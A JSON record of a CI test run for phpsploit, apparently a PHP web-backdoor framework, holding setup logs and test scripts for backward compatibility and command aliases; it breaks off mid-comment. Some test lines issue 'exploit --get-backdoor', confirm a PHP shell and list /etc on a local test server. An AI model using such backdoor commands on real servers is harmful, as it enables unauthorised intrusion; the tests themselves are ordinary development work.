{
    "repository": "nil0x42/phpsploit",
    "clone_url": "https://github.com/nil0x42/phpsploit.git",
    "timestamp": "2023-05-29T15:26:20.583689Z",
    "clone_success": true,
    "number of actions": 2,
    "number_of_test_actions": 1,
    "actions_successful": false,
    "actions_stdout": "[Unit Tests/build] \ud83d\ude80  Start image=crawlergpt:latest\n[Unit Tests/build]   \ud83d\udc33  docker pull image=crawlergpt:latest platform= username= forcePull=false\n[Unit Tests/build]   \ud83d\udc33  docker create image=crawlergpt:latest platform= entrypoint=[\"tail\" \"-f\" \"/dev/null\"] cmd=[]\n[Unit Tests/build]   \ud83d\udc33  docker run image=crawlergpt:latest platform= entrypoint=[\"tail\" \"-f\" \"/dev/null\"] cmd=[]\n[Unit Tests/build]   \ud83d\udc33  docker exec cmd=[chown -R 1012:1000 /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit] user=0 workdir=\n[Unit Tests/build]   \u2601  git clone 'https://github.com/actions/setup-python' # ref=v3\n[Unit Tests/build]   \u2601  git clone 'https://github.com/codecov/codecov-action' # ref=v2\n[Unit Tests/build] \ud83e\uddea  Matrix: map[os:ubuntu-latest python-version:3.7]\n[Unit Tests/build] \u2b50 Run Main actions/checkout@v3\n[Unit Tests/build]   \u2705  Success - Main actions/checkout@v3\n[Unit Tests/build] \u2b50 Run Main Set up Python 3.7\n[Unit Tests/build]   \ud83d\udc33  docker cp src=/home/andre-silva/.cache/act/actions-setup-python@v3/ dst=/var/run/act/actions/actions-setup-python@v3/\n[Unit Tests/build]   \ud83d\udc33  docker exec cmd=[chown -R 1012:1000 /var/run/act/actions/actions-setup-python@v3/] user=0 workdir=\n[Unit Tests/build]   \ud83d\udc33  docker exec cmd=[node /var/run/act/actions/actions-setup-python@v3/dist/setup/index.js] user= workdir=\n[Unit Tests/build]   \ud83d\udcac  ::debug::Semantic version spec of 3.7 is 3.7\n[Unit Tests/build]   \ud83d\udcac  ::debug::isExplicit: \n[Unit Tests/build]   \ud83d\udcac  ::debug::explicit? false\n[Unit Tests/build]   \ud83d\udcac  ::debug::isExplicit: 2.7.18\n[Unit Tests/build]   \ud83d\udcac  ::debug::explicit? true\n[Unit Tests/build]   \ud83d\udcac  ::debug::isExplicit: 3.5.10\n[Unit Tests/build]   \ud83d\udcac  ::debug::explicit? true\n[Unit Tests/build]   \ud83d\udcac  ::debug::isExplicit: 3.6.14\n[Unit Tests/build]   \ud83d\udcac  ::debug::explicit? true\n[Unit Tests/build]   \ud83d\udcac  ::debug::isExplicit: 3.7.11\n[Unit Tests/build]   \ud83d\udcac  ::debug::explicit? true\n[Unit Tests/build]   \ud83d\udcac  ::debug::isExplicit: 3.8.11\n[Unit Tests/build]   \ud83d\udcac  ::debug::explicit? true\n[Unit Tests/build]   \ud83d\udcac  ::debug::isExplicit: 3.9.6\n[Unit Tests/build]   \ud83d\udcac  ::debug::explicit? true\n[Unit Tests/build]   \ud83d\udcac  ::debug::evaluating 6 versions\n[Unit Tests/build]   \ud83d\udcac  ::debug::matched: 3.7.11\n[Unit Tests/build]   \ud83d\udcac  ::debug::checking cache: /opt/hostedtoolcache/Python/3.7.11/x64\n[Unit Tests/build]   \ud83d\udcac  ::debug::Found tool in cache Python 3.7.11 x64\n[Unit Tests/build]   | Successfully setup CPython (3.7.11)\n[Unit Tests/build]   \u2753 add-matcher /run/act/actions/actions-setup-python@v3/.github/python.json\n[Unit Tests/build]   \u2705  Success - Main Set up Python 3.7\n[Unit Tests/build]   \u2699  ::set-env:: pythonLocation=/opt/hostedtoolcache/Python/3.7.11/x64\n[Unit Tests/build]   \u2699  ::set-env:: LD_LIBRARY_PATH=/opt/hostedtoolcache/Python/3.7.11/x64/lib\n[Unit Tests/build]   \u2699  ::set-output:: python-version=3.7.11\n[Unit Tests/build]   \u2699  ::add-path:: /opt/hostedtoolcache/Python/3.7.11/x64\n[Unit Tests/build]   \u2699  ::add-path:: /opt/hostedtoolcache/Python/3.7.11/x64/bin\n[Unit Tests/build] \u2b50 Run Main Install coverage (for codecov)\n[Unit Tests/build]   \ud83d\udc33  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/4] user= workdir=\n[Unit Tests/build]   | Collecting coverage\n[Unit Tests/build]   |   Downloading coverage-7.2.6-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (225 kB)\n[Unit Tests/build]   | Installing collected packages: coverage\n[Unit Tests/build]   | Successfully installed coverage-7.2.6\n[Unit Tests/build]   | WARNING: You are using pip version 21.2.4; however, version 23.1.2 is available.\n[Unit Tests/build]   | You should consider upgrading via the '/opt/hostedtoolcache/Python/3.7.11/x64/bin/python -m pip install --upgrade pip' command.\n[Unit Tests/build]   \u2705  Success - Main Install coverage (for codecov)\n[Unit Tests/build] \u2b50 Run Main Install PhpSploit requirements.txt\n[Unit Tests/build]   \ud83d\udc33  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/5] user= workdir=\n[Unit Tests/build]   | Collecting phpserialize==1.3\n[Unit Tests/build]   |   Downloading phpserialize-1.3.tar.gz (7.5 kB)\n[Unit Tests/build]   | Collecting pyparsing==3.0.9\n[Unit Tests/build]   |   Downloading pyparsing-3.0.9-py3-none-any.whl (98 kB)\n[Unit Tests/build]   | Collecting PySocks==1.7.1\n[Unit Tests/build]   |   Downloading PySocks-1.7.1-py3-none-any.whl (16 kB)\n[Unit Tests/build]   | Collecting ExtProxy==1.0.2\n[Unit Tests/build]   |   Downloading ExtProxy-1.0.2-py2.py3-none-any.whl (11 kB)\n[Unit Tests/build]   | Collecting pygments==2.14.0\n[Unit Tests/build]   |   Downloading Pygments-2.14.0-py3-none-any.whl (1.1 MB)\n[Unit Tests/build]   | Using legacy 'setup.py install' for phpserialize, since package 'wheel' is not installed.\n[Unit Tests/build]   | Installing collected packages: PySocks, pyparsing, pygments, phpserialize, ExtProxy\n[Unit Tests/build]   |     Running setup.py install for phpserialize: started\n[Unit Tests/build]   |     Running setup.py install for phpserialize: finished with status 'done'\n[Unit Tests/build]   | Successfully installed ExtProxy-1.0.2 PySocks-1.7.1 phpserialize-1.3 pygments-2.14.0 pyparsing-3.0.9\n[Unit Tests/build]   | WARNING: You are using pip version 21.2.4; however, version 23.1.2 is available.\n[Unit Tests/build]   | You should consider upgrading via the '/opt/hostedtoolcache/Python/3.7.11/x64/bin/python -m pip install --upgrade pip' command.\n[Unit Tests/build]   \u2705  Success - Main Install PhpSploit requirements.txt\n[Unit Tests/build] \u2b50 Run Main Run phpsploit unit tests\n[Unit Tests/build]   \ud83d\udc33  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/6] user= workdir=\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/backward_compat/v2.1.4/RUN.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/backward_compat/v2.1.4\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/backward_compat/v2.1.4\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/backward_compat/v2.1.4/RUN.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.QFyoGWSzB9\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m< $SCRIPTDIR/phpsploit.session \\\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    sed -e \"s/127.0.0.1:64956/$TARGET/g\" \\\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    > $TMPDIR/tmp-session\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e \"session load $TMPDIR/tmp-session\" || FAIL\u001b[m\n[Unit Tests/build]   | [#] CMD('set' 'VERBOSITY' 'True'): Returned 0\n[Unit Tests/build]   | [#] CMD('set' 'REQ_INTERVAL' '0'): Running...\n[Unit Tests/build]   | [#] CMD('set' 'REQ_INTERVAL' '0'): Returned 0\n[Unit Tests/build]   | [#] CMD('alias' 'true' 'lrun true'): Running...\n[Unit Tests/build]   | [#] CMD('alias' 'true' 'lrun true'): Returned 0\n[Unit Tests/build]   | [#] CMD('alias' '@lrun' 'lrun'): Running...\n[Unit Tests/build]   | [#] CMD('alias' '@lrun' 'lrun'): Returned 0\n[Unit Tests/build]   | [#] CMD('set' 'TARGET' '127.0.0.1:42211'): Running...\n[Unit Tests/build]   | [#] CMD('set' 'TARGET' '127.0.0.1:42211'): Returned 0\n[Unit Tests/build]   | [#] CMD('source' '-e' '/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config/config'): Returned 0\n[Unit Tests/build]   | [#] CMD('session' 'load' '/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp-session'): Running...\n[Unit Tests/build]   | [#] Session file correctly loaded\n[Unit Tests/build]   | [#] CMD('session' 'load' '/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp-session'): Returned 0\n[Unit Tests/build]   | \n[Unit Tests/build]   | [#] CMD('exit'): Running...\n[Unit Tests/build]   | [#] Traceback (most recent call last):\n[Unit Tests/build]   | [#]   File \"/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/src/shnake-0.5/shnake/shell.py\", line 300, in onecmd\n[Unit Tests/build]   | [#]     return cmdrun(argv)\n[Unit Tests/build]   | [#]   File \"/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/src/ui/interface.py\", line 198, in do_exit\n[Unit Tests/build]   | [#]     exit()\n[Unit Tests/build]   | [#]   File \"/opt/hostedtoolcache/Python/3.7.11/x64/lib/python3.7/_sitebuiltins.py\", line 26, in __call__\n[Unit Tests/build]   | [#]     raise SystemExit(code)\n[Unit Tests/build]   | [#] SystemExit: None\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe session load $TMPDIR/tmp-session || FAIL\u001b[m\n[Unit Tests/build]   | [#] CMD('set' 'VERBOSITY' 'True'): Returned 0\n[Unit Tests/build]   | [#] CMD('set' 'REQ_INTERVAL' '0'): Running...\n[Unit Tests/build]   | [#] CMD('set' 'REQ_INTERVAL' '0'): Returned 0\n[Unit Tests/build]   | [#] CMD('alias' 'true' 'lrun true'): Running...\n[Unit Tests/build]   | [#] CMD('alias' 'true' 'lrun true'): Returned 0\n[Unit Tests/build]   | [#] CMD('alias' '@lrun' 'lrun'): Running...\n[Unit Tests/build]   | [#] CMD('alias' '@lrun' 'lrun'): Returned 0\n[Unit Tests/build]   | [#] CMD('set' 'TARGET' '127.0.0.1:42211'): Running...\n[Unit Tests/build]   | [#] CMD('set' 'TARGET' '127.0.0.1:42211'): Returned 0\n[Unit Tests/build]   | [#] CMD('source' '-e' '/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config/config'): Returned 0\n[Unit Tests/build]   | [#] CMD('session' 'load' '/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp-session'): Running...\n[Unit Tests/build]   | [#] Session file correctly loaded\n[Unit Tests/build]   | [#] CMD('session' 'load' '/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp-session'): Returned 0\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# this one must FAIL (not confirming env reset)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe \"exploit\\nN\" > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"TARGET server have changed, are you sure you want to reset environment as shown above\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"Exploitation aborted\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# this one must SUCCEED (confirming env reset)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe \"exploit\\nY\" > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"TARGET server have changed, are you sure you want to reset environment as shown above\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"Environment correctly reset\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"Shell obtained by PHP\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/backward_compat/v2.1.4/RUN.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=3s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/alias.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/alias.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.3rwsZeIXjd\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/usr/bin/env bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### CHECK ALIAS WARNINGS\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### XXX: PUTTING THIS ON TOP OF TEST FILE BECAUSE SHOULD WORK EVEN IF NOT CONNECTED\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# dummy command, so next one don't contain useless\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit initialization lines\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe anything > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# deleting an existing alias:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# issue #59: `alias <VAR> None` misses verbosity\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias FOO BAR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[[ $(count_lines $TMPFILE) -eq 0 ]] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias FOO None > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE 'alias correctly deleted'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# overriding an existing alias:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias FOO BAR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[[ $(count_lines $TMPFILE) -eq 0 ]] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias FOO None > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE 'alias correctly deleted'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# overriding an existing core command:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias history BAR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE ' command overridden'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# overriding an existing plugin:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias stat BAR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE ' plugin overridden'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### CHECK ALIAS CREATION & NESTING BEHAVIOR\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# create misc aliases for test\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias l-startsiwhL FOO > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias l-startsiwhLagain BAR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias idontstartWithL BAZ > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# this should only show aliases starting with 'l'\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias l > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2msed -e '1,/---/d' -e '/^$/,$d' $TMPFILE | grep -vq '^    l' && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# but calling `alias` alone lists all aliases:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2msed -e '1,/---/d' -e '/^$/,$d' $TMPFILE | grep -vq '^    l' || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# check that alias is equal to it's original command\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias \"'@foo.bar'\" lrun ls > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe @foo.bar --color=always -1 / > $TMPFILE-alias || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe lrun ls --color=always -1 / > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-alias $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# commands & plugins can be overridden by aliases\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias lrun \"exploit --get-backdoor\" > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe lrun > $TMPFILE-cmd-override\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe exploit --get-backdoor > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-cmd-override $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# but the alias referencing `lrun` still uses real command\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# because phpsploit nested aliases do not exist in phpsploit:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe @foo.bar --color=always -1 / > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-alias $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# thanks to non-nesting, you can alias ls to 'ls /'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# without circular calling issue:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias ls ls /etc > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe exploit > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe ls > $TMPFILE-alias || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# remove that alias, and `ls` becomes `ls` again !\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias ls None > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE '`ls` alias correctly deleted'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# now that ls is real `ls`, it should have different output:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe ls > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMFILE-alias $TMPFILE > $TMPFILE-err && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff: missing operand after '/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.3rwsZeIXjd'\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff: Try 'diff --help' for more information.\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE-err\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# but calling `ls / gives same output as previous call to `ls` alias:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe ls /etc > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-alias $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### CHECK INVALID ALIAS NAMES\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# keep track of previously existing aliases\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias > $TMPFILE-ref || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# issue #101: crash: 